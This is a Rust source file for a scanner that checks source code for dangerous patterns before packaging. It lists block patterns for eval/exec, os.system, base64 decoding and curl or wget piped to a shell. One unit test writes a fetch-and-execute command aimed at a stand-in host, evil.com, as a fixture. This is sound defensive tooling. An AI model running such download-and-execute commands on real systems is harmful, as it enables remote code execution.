//! L1 Source Policy Scanner
//!
//! Migrated from nacelle/src/verification/verifier.rs
//! Scans source code for dangerous patterns before packaging.

use anyhow::Result;
use regex::Regex;
use std::path::Path;
use tracing::{info, warn};

/// Dangerous patterns that indicate potential security risks
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("base64 -d", "Base64 decode in shell"),
    ("base64 --decode", "Base64 decode in shell"),
    ("eval(", "Dynamic code evaluation"),
    ("exec(", "Dynamic code execution"),
    // Shell pipe patterns (with various spacing)
    ("| sh", "Remote script execution via pipe to sh"),
    ("|sh", "Remote script execution via pipe to sh"),
    ("| bash", "Remote script execution via pipe to bash"),
    ("|bash", "Remote script execution via pipe to bash"),
    ("__import__", "Dynamic Python import"),
    ("importlib.import_module", "Dynamic Python import"),
    ("subprocess.Popen", "Subprocess execution (requires review)"),
    ("os.system(", "Shell command execution"),
    ("os.popen(", "Shell command execution"),
];

/// Regex patterns for L1 policy checks
const DANGEROUS_REGEX_PATTERNS: &[(&str, &str)] = &[
    // Remote code injection via curl/wget piped to shell
    (
        r"(?i)(curl|wget)\s+.*\|\s*(sh|bash|zsh|ksh)",
        "Remote code injection via pipe to shell",
    ),
    // Hidden network fetches with shell execution
    (
        r"(?i)(curl|wget)\s+-[a-z]*s[a-z]*\s+.*\|\s*\w+",
        "Hidden download piped to command",
    ),
];

/// L1 Source Policy error
#[derive(Debug)]
pub enum L1PolicyError {
    BlobNotFound(String),
    DangerousPattern {
        file: String,
        line: usize,
        pattern: String,
        description: String,
    },
    IoError(std::io::Error),
}

impl std::fmt::Display for L1PolicyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            L1PolicyError::BlobNotFound(path) => {
                write!(f, "Source directory not found: {}", path)
            }
            L1PolicyError::DangerousPattern {
                file,
                line,
                pattern,
                description,
            } => {
                write!(
                    f,
                    "Dangerous pattern '{}' found in {}:{} - {}",
                    pattern, file, line, description
                )
            }
            L1PolicyError::IoError(e) => write!(f, "IO error: {}", e),
        }
    }
}

impl std::error::Error for L1PolicyError {}

impl From<std::io::Error> for L1PolicyError {
    fn from(err: std::io::Error) -> Self {
        L1PolicyError::IoError(err)
    }
}

/// Scan source directory for dangerous patterns
///
/// # Arguments
/// * `source_path` - Path to the source code directory
/// * `scan_extensions` - File extensions to scan (e.g., ["py", "sh", "js"])
///
/// # Returns
/// * `Ok(())` if no dangerous patterns found
/// * `Err(L1PolicyError)` if dangerous patterns detected
pub fn scan_source_directory(
    source_path: &Path,
    scan_extensions: &[&str],
) -> Result<(), L1PolicyError> {
    if !source_path.exists() {
        return Err(L1PolicyError::BlobNotFound(
            source_path.display().to_string(),
        ));
    }

    info!(
        "🔍 L1 Source Policy: Scanning {:?} for dangerous patterns",
        source_path
    );

    scan_directory_for_patterns(source_path, scan_extensions)?;

    info!("✅ L1 Source Policy: No dangerous patterns detected");
    Ok(())
}

/// Recursively scan directory for dangerous patterns
fn scan_directory_for_patterns(dir: &Path, scan_extensions: &[&str]) -> Result<(), L1PolicyError> {
    let regex_patterns: Vec<(Regex, &str)> = DANGEROUS_REGEX_PATTERNS
        .iter()
        .map(|(pattern, desc)| (Regex::new(pattern).unwrap(), *desc))
        .collect();

    for entry in walkdir::WalkDir::new(dir)
        .follow_links(false)
        .into_iter()
        .filter_map(|e| e.ok())
    {
        let path = entry.path();

        // Skip directories
        if !path.is_file() {
            continue;
        }

        // Check if file extension matches scan list
        let should_scan = if scan_extensions.is_empty() {
            true // Scan all files if no extensions specified
        } else {
            path.extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| scan_extensions.contains(&ext))
                .unwrap_or(false)
        };

        if should_scan {
            scan_file_for_patterns(path, &regex_patterns)?;
        }
    }

    Ok(())
}

/// Scan a single file for dangerous patterns
fn scan_file_for_patterns(
    file_path: &Path,
    regex_patterns: &[(Regex, &str)],
) -> Result<(), L1PolicyError> {
    let content = std::fs::read_to_string(file_path)?;

    for (line_num, line) in content.lines().enumerate() {
        let line_num = line_num + 1; // 1-indexed

        // Check simple substring patterns
        for (pattern, description) in DANGEROUS_PATTERNS {
            if line.contains(pattern) {
                warn!(
                    "⚠️  Dangerous pattern detected: {} at {}:{}",
                    pattern,
                    file_path.display(),
                    line_num
                );
                return Err(L1PolicyError::DangerousPattern {
                    file: file_path.display().to_string(),
                    line: line_num,
                    pattern: pattern.to_string(),
                    description: description.to_string(),
                });
            }
        }

        // Check regex patterns
        for (regex, description) in regex_patterns {
            if regex.is_match(line) {
                let matched = regex.find(line).unwrap().as_str();
                warn!(
                    "⚠️  Dangerous pattern detected: {} at {}:{}",
                    matched,
                    file_path.display(),
                    line_num
                );
                return Err(L1PolicyError::DangerousPattern {
                    file: file_path.display().to_string(),
                    line: line_num,
                    pattern: matched.to_string(),
                    description: description.to_string(),
                });
            }
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn test_scan_clean_python_file() {
        let temp = tempdir().unwrap();
        let file_path = temp.path().join("clean.py");
        fs::write(&file_path, "print('Hello, World!')").unwrap();

        let result = scan_source_directory(temp.path(), &["py"]);
        assert!(result.is_ok());
    }

    #[test]
    fn test_detect_eval_pattern() {
        let temp = tempdir().unwrap();
        let file_path = temp.path().join("bad.py");
        fs::write(&file_path, "eval('print(1)')").unwrap();

        let result = scan_source_directory(temp.path(), &["py"]);
        assert!(result.is_err());

        if let Err(L1PolicyError::DangerousPattern { pattern, .. }) = result {
            assert_eq!(pattern, "eval(");
        }
    }

    #[test]
    fn test_detect_curl_pipe_sh() {
        let temp = tempdir().unwrap();
        let file_path = temp.path().join("bad.sh");
        fs::write(&file_path, "curl http://evil.com/script.sh | sh").unwrap();

        let result = scan_source_directory(temp.path(), &["sh"]);
        assert!(result.is_err());
    }

    #[test]
    fn test_scan_missing_directory() {
        let result = scan_source_directory(Path::new("/nonexistent"), &["py"]);
        assert!(result.is_err());

        if let Err(L1PolicyError::BlobNotFound(_)) = result {
            // Expected
        } else {
            panic!("Expected BlobNotFound error");
        }
    }

    #[test]
    fn test_scan_with_extension_filter() {
        let temp = tempdir().unwrap();

        // Create Python file with dangerous pattern
        let py_file = temp.path().join("bad.py");
        fs::write(&py_file, "eval('bad')").unwrap();

        // Create JS file (should be ignored)
        let js_file = temp.path().join("safe.js");
        fs::write(&js_file, "eval('ignored')").unwrap();

        // Scan only .py files
        let result = scan_source_directory(temp.path(), &["py"]);
        assert!(result.is_err()); // Should catch .py file

        // Scan only .js files
        let result = scan_source_directory(temp.path(), &["js"]);
        assert!(result.is_err()); // Should catch .js file

        // Scan only .txt files (neither should match)
        let result = scan_source_directory(temp.path(), &["txt"]);
        assert!(result.is_ok()); // Should be clean
    }
}
